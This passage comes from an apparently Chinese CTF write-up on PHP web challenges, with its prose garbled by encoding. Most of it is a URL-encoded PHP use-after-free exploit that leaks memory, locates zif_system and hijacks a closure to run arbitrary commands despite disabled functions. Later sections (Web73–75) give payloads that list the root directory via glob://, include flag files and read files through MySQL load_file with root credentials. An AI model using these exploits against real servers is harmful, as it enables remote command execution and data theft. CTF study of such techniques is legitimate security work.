class="title">c</span>%24<span class="title">v</span>+%26+0<span class="title">xff</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">v</span>+%3<span class="title">e</span>%3<span class="title">e</span>%3<span class="title">d</span>+8%3<span class="title">b</span>%0<span class="title">a</span>++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">leak</span>(%24<span class="title">addr</span>%2<span class="title">c</span>+%24<span class="title">p</span>+%3<span class="title">d</span>+0%2<span class="title">c</span>+%24<span class="title">s</span>+%3<span class="title">d</span>+8)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">global</span>+%24<span class="title">abc</span>%2<span class="title">c</span>+%24<span class="title">helper</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">x68</span>%2<span class="title">c</span>+%24<span class="title">addr</span>+%2<span class="title">b</span>+%24<span class="title">p</span>+-+0<span class="title">x10</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">leak</span>+%3<span class="title">d</span>+<span class="title">strlen</span>(%24<span class="title">helper</span>-%3<span class="title">ea</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">if</span>(%24<span class="title">s</span>+!%3<span class="title">d</span>+8)+%7<span class="title">b</span>+%24<span class="title">leak</span>+%25%3<span class="title">d</span>+2+%3<span class="title">c</span>%3<span class="title">c</span>+(%24<span class="title">s</span>+*+8)+-+1%3<span class="title">b</span>+%7<span class="title">d</span>%0<span class="title">a</span>++++++++<span class="title">return</span>+%24<span class="title">leak</span>%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">parse_elf</span>(%24<span class="title">base</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">e_type</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">base</span>%2<span class="title">c</span>+0<span class="title">x10</span>%2<span class="title">c</span>+2)%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++++++%24<span class="title">e_phoff</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">base</span>%2<span class="title">c</span>+0<span class="title">x20</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">e_phentsize</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">base</span>%2<span class="title">c</span>+0<span class="title">x36</span>%2<span class="title">c</span>+2)%3<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">e_phnum</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">base</span>%2<span class="title">c</span>+0<span class="title">x38</span>%2<span class="title">c</span>+2)%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++++++<span class="title">for</span>(%24<span class="title">i</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>+%24<span class="title">i</span>+%3<span class="title">c</span>+%24<span class="title">e_phnum</span>%3<span class="title">b</span>+%24<span class="title">i</span>%2<span class="title">b</span>%2<span class="title">b</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">header</span>+%3<span class="title">d</span>+%24<span class="title">base</span>+%2<span class="title">b</span>+%24<span class="title">e_phoff</span>+%2<span class="title">b</span>+%24<span class="title">i</span>+*+%24<span class="title">e_phentsize</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">p_type</span>++%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">header</span>%2<span class="title">c</span>+0%2<span class="title">c</span>+4)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">p_flags</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">header</span>%2<span class="title">c</span>+4%2<span class="title">c</span>+4)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">p_vaddr</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">header</span>%2<span class="title">c</span>+0<span class="title">x10</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">p_memsz</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">header</span>%2<span class="title">c</span>+0<span class="title">x28</span>)%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++++++++++<span class="title">if</span>(%24<span class="title">p_type</span>+%3<span class="title">d</span>%3<span class="title">d</span>+1+%26%26+%24<span class="title">p_flags</span>+%3<span class="title">d</span>%3<span class="title">d</span>+6)+%7<span class="title">b</span>+%23+<span class="title">PT_LOAD</span>%2<span class="title">c</span>+<span class="title">PF_Read_Write</span>%0<span class="title">a</span>++++++++++++++++%23+<span class="title">handle</span>+<span class="title">pie</span>%0<span class="title">a</span>++++++++++++++++%24<span class="title">data_addr</span>+%3<span class="title">d</span>+%24<span class="title">e_type</span>+%3<span class="title">d</span>%3<span class="title">d</span>+2+%3<span class="title">f</span>+%24<span class="title">p_vaddr</span>+%3<span class="title">a</span>+%24<span class="title">base</span>+%2<span class="title">b</span>+%24<span class="title">p_vaddr</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++++++%24<span class="title">data_size</span>+%3<span class="title">d</span>+%24<span class="title">p_memsz</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%7<span class="title">d</span>+<span class="title">else</span>+<span class="title">if</span>(%24<span class="title">p_type</span>+%3<span class="title">d</span>%3<span class="title">d</span>+1+%26%26+%24<span class="title">p_flags</span>+%3<span class="title">d</span>%3<span class="title">d</span>+5)+%7<span class="title">b</span>+%23+<span class="title">PT_LOAD</span>%2<span class="title">c</span>+<span class="title">PF_Read_exec</span>%0<span class="title">a</span>++++++++++++++++%24<span class="title">text_size</span>+%3<span class="title">d</span>+%24<span class="title">p_memsz</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++++++<span class="title">if</span>(!%24<span class="title">data_addr</span>+%7<span class="title">c</span>%7<span class="title">c</span>+!%24<span class="title">text_size</span>+%7<span class="title">c</span>%7<span class="title">c</span>+!%24<span class="title">data_size</span>)%0<span class="title">a</span>++++++++++++<span class="title">return</span>+<span class="title">false</span>%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++++++<span class="title">return</span>+%5<span class="title">b</span>%24<span class="title">data_addr</span>%2<span class="title">c</span>+%24<span class="title">text_size</span>%2<span class="title">c</span>+%24<span class="title">data_size</span>%5<span class="title">d</span>%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">get_basic_funcs</span>(%24<span class="title">base</span>%2<span class="title">c</span>+%24<span class="title">elf</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">list</span>(%24<span class="title">data_addr</span>%2<span class="title">c</span>+%24<span class="title">text_size</span>%2<span class="title">c</span>+%24<span class="title">data_size</span>)+%3<span class="title">d</span>+%24<span class="title">elf</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">for</span>(%24<span class="title">i</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>+%24<span class="title">i</span>+%3<span class="title">c</span>+%24<span class="title">data_size</span>+%2<span class="title">f</span>+8%3<span class="title">b</span>+%24<span class="title">i</span>%2<span class="title">b</span>%2<span class="title">b</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">leak</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">data_addr</span>%2<span class="title">c</span>+%24<span class="title">i</span>+*+8)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++<span class="title">if</span>(%24<span class="title">leak</span>+-+%24<span class="title">base</span>+%3<span class="title">e</span>+0+%26%26+%24<span class="title">leak</span>+-+%24<span class="title">base</span>+%3<span class="title">c</span>+%24<span class="title">data_addr</span>+-+%24<span class="title">base</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++++++%24<span class="title">deref</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">leak</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++++++%23+%27<span class="title">constant</span>%27+<span class="title">constant</span>+<span class="title">check</span>%0<span class="title">a</span>++++++++++++++++<span class="title">if</span>(%24<span class="title">deref</span>+!%3<span class="title">d</span>+0<span class="title">x746e6174736e6f63</span>)%0<span class="title">a</span>++++++++++++++++++++<span class="title">continue</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%7<span class="title">d</span>+<span class="title">else</span>+<span class="title">continue</span>%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++++++++++%24<span class="title">leak</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">data_addr</span>%2<span class="title">c</span>+(%24<span class="title">i</span>+%2<span class="title">b</span>+4)+*+8)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++<span class="title">if</span>(%24<span class="title">leak</span>+-+%24<span class="title">base</span>+%3<span class="title">e</span>+0+%26%26+%24<span class="title">leak</span>+-+%24<span class="title">base</span>+%3<span class="title">c</span>+%24<span class="title">data_addr</span>+-+%24<span class="title">base</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++++++%24<span class="title">deref</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">leak</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++++++%23+%27<span class="title">bin2hex</span>%27+<span class="title">constant</span>+<span class="title">check</span>%0<span class="title">a</span>++++++++++++++++<span class="title">if</span>(%24<span class="title">deref</span>+!%3<span class="title">d</span>+0<span class="title">x786568326e6962</span>)%0<span class="title">a</span>++++++++++++++++++++<span class="title">continue</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%7<span class="title">d</span>+<span class="title">else</span>+<span class="title">continue</span>%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++++++++++<span class="title">return</span>+%24<span class="title">data_addr</span>+%2<span class="title">b</span>+%24<span class="title">i</span>+*+8%3<span class="title">b</span>%0<span class="title">a</span>++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">get_binary_base</span>(%24<span class="title">binary_leak</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">base</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">start</span>+%3<span class="title">d</span>+%24<span class="title">binary_leak</span>+%26+0<span class="title">xfffffffffffff000</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">for</span>(%24<span class="title">i</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>+%24<span class="title">i</span>+%3<span class="title">c</span>+0<span class="title">x1000</span>%3<span class="title">b</span>+%24<span class="title">i</span>%2<span class="title">b</span>%2<span class="title">b</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">addr</span>+%3<span class="title">d</span>+%24<span class="title">start</span>+-+0<span class="title">x1000</span>+*+%24<span class="title">i</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">leak</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">addr</span>%2<span class="title">c</span>+0%2<span class="title">c</span>+7)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++<span class="title">if</span>(%24<span class="title">leak</span>+%3<span class="title">d</span>%3<span class="title">d</span>+0<span class="title">x10102464c457f</span>)+%7<span class="title">b</span>+%23+<span class="title">ELF</span>+<span class="title">header</span>%0<span class="title">a</span>++++++++++++++++<span class="title">return</span>+%24<span class="title">addr</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">get_system</span>(%24<span class="title">basic_funcs</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">addr</span>+%3<span class="title">d</span>+%24<span class="title">basic_funcs</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">do</span>+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">f_entry</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">addr</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">f_name</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">f_entry</span>%2<span class="title">c</span>+0%2<span class="title">c</span>+6)%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++++++++++<span class="title">if</span>(%24<span class="title">f_name</span>+%3<span class="title">d</span>%3<span class="title">d</span>+0<span class="title">x6d6574737973</span>)+%7<span class="title">b</span>+%23+<span class="title">system</span>%0<span class="title">a</span>++++++++++++++++<span class="title">return</span>+<span class="title">leak</span>(%24<span class="title">addr</span>+%2<span class="title">b</span>+8)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++++++++++%24<span class="title">addr</span>+%2<span class="title">b</span>%3<span class="title">d</span>+0<span class="title">x20</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++%7<span class="title">d</span>+<span class="title">while</span>(%24<span class="title">f_entry</span>+!%3<span class="title">d</span>+0)%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">return</span>+<span class="title">false</span>%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">trigger_uaf</span>(%24<span class="title">arg</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++%23+<span class="title">str_shuffle</span>+<span class="title">prevents</span>+<span class="title">opcache</span>+<span class="title">string</span>+<span class="title">interning</span>%0<span class="title">a</span>++++++++%24<span class="title">arg</span>+%3<span class="title">d</span>+<span class="title">str_shuffle</span>(%27<span class="title">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>%27)%3<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">vuln</span>+%3<span class="title">d</span>+<span class="title">new</span>+<span class="title">Vuln</span>()%3<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">vuln</span>-%3<span class="title">ea</span>+%3<span class="title">d</span>+%24<span class="title">arg</span>%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">if</span>(<span class="title">stristr</span>(<span class="title">PHP_OS</span>%2<span class="title">c</span>+%27<span class="title">WIN</span>%27))+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">die</span>(%27<span class="title">This</span>+<span class="title">PoC</span>+<span class="title">is</span>+<span class="title">for</span>+*<span class="title">nix</span>+<span class="title">systems</span>+<span class="title">only</span>.%27)%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%24<span class="title">n_alloc</span>+%3<span class="title">d</span>+10%3<span class="title">b</span>+%23+<span class="title">increase</span>+<span class="title">this</span>+<span class="title">value</span>+<span class="title">if</span>+<span class="title">UAF</span>+<span class="title">fails</span>%0<span class="title">a</span>++++%24<span class="title">contiguous</span>+%3<span class="title">d</span>+%5<span class="title">b</span>%5<span class="title">d</span>%3<span class="title">b</span>%0<span class="title">a</span>++++<span class="title">for</span>(%24<span class="title">i</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>+%24<span class="title">i</span>+%3<span class="title">c</span>+%24<span class="title">n_alloc</span>%3<span class="title">b</span>+%24<span class="title">i</span>%2<span class="title">b</span>%2<span class="title">b</span>)%0<span class="title">a</span>++++++++%24<span class="title">contiguous</span>%5<span class="title">b</span>%5<span class="title">d</span>+%3<span class="title">d</span>+<span class="title">str_shuffle</span>(%27<span class="title">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>%27)%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">trigger_uaf</span>(%27<span class="title">x</span>%27)%3<span class="title">b</span>%0<span class="title">a</span>++++%24<span class="title">abc</span>+%3<span class="title">d</span>+%24<span class="title">backtrace</span>%5<span class="title">b1</span>%5<span class="title">d</span>%5<span class="title">b</span>%27<span class="title">args</span>%27%5<span class="title">d</span>%5<span class="title">b0</span>%5<span class="title">d</span>%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%24<span class="title">helper</span>+%3<span class="title">d</span>+<span class="title">new</span>+<span class="title">Helper</span>%3<span class="title">b</span>%0<span class="title">a</span>++++%24<span class="title">helper</span>-%3<span class="title">eb</span>+%3<span class="title">d</span>+<span class="title">function</span>+(%24<span class="title">x</span>)+%7<span class="title">b</span>+%7<span class="title">d</span>%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">if</span>(<span class="title">strlen</span>(%24<span class="title">abc</span>)+%3<span class="title">d</span>%3<span class="title">d</span>+79+%7<span class="title">c</span>%7<span class="title">c</span>+<span class="title">strlen</span>(%24<span class="title">abc</span>)+%3<span class="title">d</span>%3<span class="title">d</span>+0)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">die</span>(%22<span class="title">UAF</span>+<span class="title">failed</span>%22)%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%23+<span class="title">leaks</span>%0<span class="title">a</span>++++%24<span class="title">closure_handlers</span>+%3<span class="title">d</span>+<span class="title">str2ptr</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0)%3<span class="title">b</span>%0<span class="title">a</span>++++%24<span class="title">php_heap</span>+%3<span class="title">d</span>+<span class="title">str2ptr</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">x58</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++%24<span class="title">abc_addr</span>+%3<span class="title">d</span>+%24<span class="title">php_heap</span>+-+0<span class="title">xc8</span>%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%23+<span class="title">fake</span>+<span class="title">value</span>%0<span class="title">a</span>++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">x60</span>%2<span class="title">c</span>+2)%3<span class="title">b</span>%0<span class="title">a</span>++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">x70</span>%2<span class="title">c</span>+6)%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%23+<span class="title">fake</span>+<span class="title">reference</span>%0<span class="title">a</span>++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">x10</span>%2<span class="title">c</span>+%24<span class="title">abc_addr</span>+%2<span class="title">b</span>+0<span class="title">x60</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">x18</span>%2<span class="title">c</span>+0<span class="title">xa</span>)%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%24<span class="title">closure_obj</span>+%3<span class="title">d</span>+<span class="title">str2ptr</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">x20</span>)%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%24<span class="title">binary_leak</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">closure_handlers</span>%2<span class="title">c</span>+8)%3<span class="title">b</span>%0<span class="title">a</span>++++<span class="title">if</span>(!(%24<span class="title">base</span>+%3<span class="title">d</span>+<span class="title">get_binary_base</span>(%24<span class="title">binary_leak</span>)))+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">die</span>(%22<span class="title">Couldn</span>%27<span class="title">t</span>+<span class="title">determine</span>+<span class="title">binary</span>+<span class="title">base</span>+<span class="title">address</span>%22)%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">if</span>(!(%24<span class="title">elf</span>+%3<span class="title">d</span>+<span class="title">parse_elf</span>(%24<span class="title">base</span>)))+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">die</span>(%22<span class="title">Couldn</span>%27<span class="title">t</span>+<span class="title">parse</span>+<span class="title">ELF</span>+<span class="title">header</span>%22)%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">if</span>(!(%24<span class="title">basic_funcs</span>+%3<span class="title">d</span>+<span class="title">get_basic_funcs</span>(%24<span class="title">base</span>%2<span class="title">c</span>+%24<span class="title">elf</span>)))+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">die</span>(%22<span class="title">Couldn</span>%27<span class="title">t</span>+<span class="title">get</span>+<span class="title">basic_functions</span>+<span class="title">address</span>%22)%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">if</span>(!(%24<span class="title">zif_system</span>+%3<span class="title">d</span>+<span class="title">get_system</span>(%24<span class="title">basic_funcs</span>)))+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">die</span>(%22<span class="title">Couldn</span>%27<span class="title">t</span>+<span class="title">get</span>+<span class="title">zif_system</span>+<span class="title">address</span>%22)%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%23+<span class="title">fake</span>+<span class="title">closure</span>+<span class="title">object</span>%0<span class="title">a</span>++++%24<span class="title">fake_obj_offset</span>+%3<span class="title">d</span>+0<span class="title">xd0</span>%3<span class="title">b</span>%0<span class="title">a</span>++++<span class="title">for</span>(%24<span class="title">i</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>+%24<span class="title">i</span>+%3<span class="title">c</span>+0<span class="title">x110</span>%3<span class="title">b</span>+%24<span class="title">i</span>+%2<span class="title">b</span>%3<span class="title">d</span>+8)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+%24<span class="title">fake_obj_offset</span>+%2<span class="title">b</span>+%24<span class="title">i</span>%2<span class="title">c</span>+<span class="title">leak</span>(%24<span class="title">closure_obj</span>%2<span class="title">c</span>+%24<span class="title">i</span>))%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%23+<span class="title">pwn</span>%0<span class="title">a</span>++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">x20</span>%2<span class="title">c</span>+%24<span class="title">abc_addr</span>+%2<span class="title">b</span>+%24<span class="title">fake_obj_offset</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">xd0</span>+%2<span class="title">b</span>+0<span class="title">x38</span>%2<span class="title">c</span>+1%2<span class="title">c</span>+4)%3<span class="title">b</span>+%23+<span class="title">internal</span>+<span class="title">func</span>+<span class="title">type</span>%0<span class="title">a</span>++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">xd0</span>+%2<span class="title">b</span>+0<span class="title">x68</span>%2<span class="title">c</span>+%24<span class="title">zif_system</span>)%3<span class="title">b</span>+%23+<span class="title">internal</span>+<span class="title">func</span>+<span class="title">handler</span>%0<span class="title">a</span>%0<span class="title">a</span>++++(%24<span class="title">helper</span>-%3<span class="title">eb</span>)(%24<span class="title">cmd</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++<span class="title">exit</span>()%3<span class="title">b</span>%0<span class="title">a</span>%7<span class="title">d</span></span></span><br></pre></td></tr></table></figure><h1 id="web73"><a class="markdownIt-Anchor" href="#web73">#</a> Web73ï¼š</h1><p>â€‹åˆæ˜¯ï¼Œæ²¡æºç ï¼Œé‚£å°± glob éå†æ–‡ä»¶ç›®å½•å§ï¼Œå½“ç„¶ var_export ä¹Ÿå¯ä»¥åšåˆ°è¿™é‡Œæ²¡æœ‰è¢« banï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&quot;    &quot;</span> ;&#125;<span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#bin dev etc flagc.txt home lib media mnt opt proc root run sbin srv sys tmp usr var </span></span><br></pre></td></tr></table></figure><p>â€‹çªç„¶å‘ç° include è¯»å–æ–‡ä»¶åˆå¯ä»¥äº†ï¼Œç›´æ¥è¯»ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">indlude</span>(<span class="string">&quot;/flagc.txt&quot;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><h1 id="web74"><a class="markdownIt-Anchor" href="#web74">#</a> Web74ï¼š</h1><p>â€‹è¿™ä¸€é¢˜ ban äº† scandirï¼Œé‚£å°±ç›´æ¥ glob ç»•è¿‡ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&quot;    &quot;</span> ;&#125;<span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#bin dev etc flagx.txt home lib media mnt opt proc root run sbin srv sys tmp usr var </span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹å include å»è¯»ã€‚</p><h1 id="web75"><a class="markdownIt-Anchor" href="#web75">#</a> Web75ï¼š</h1><p>â€‹glob è¯»æ ¹ç›®å½•ç»“æ„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&quot;    &quot;</span> ;&#125;<span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#bin dev etc flag36.txt home lib media mnt opt proc root run sbin srv sys tmp usr var </span></span><br></pre></td></tr></table></figure><p>â€‹å¤šæ¬¡æµ‹è¯•ï¼Œå‘ç°æ— æ³•è¯»å–æ–‡ä»¶ï¼Œå¯ä»¥è¯•ç€åˆ©ç”¨ mysql å»è¯»å–æ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=information_schema&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">  <span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>) &#123;  </span><br><span class="line">      <span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$dbh</span> = <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;;<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>â€‹ç®€å•è§£é‡Šä¸€ä¸‹è¿™ä¸ª payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 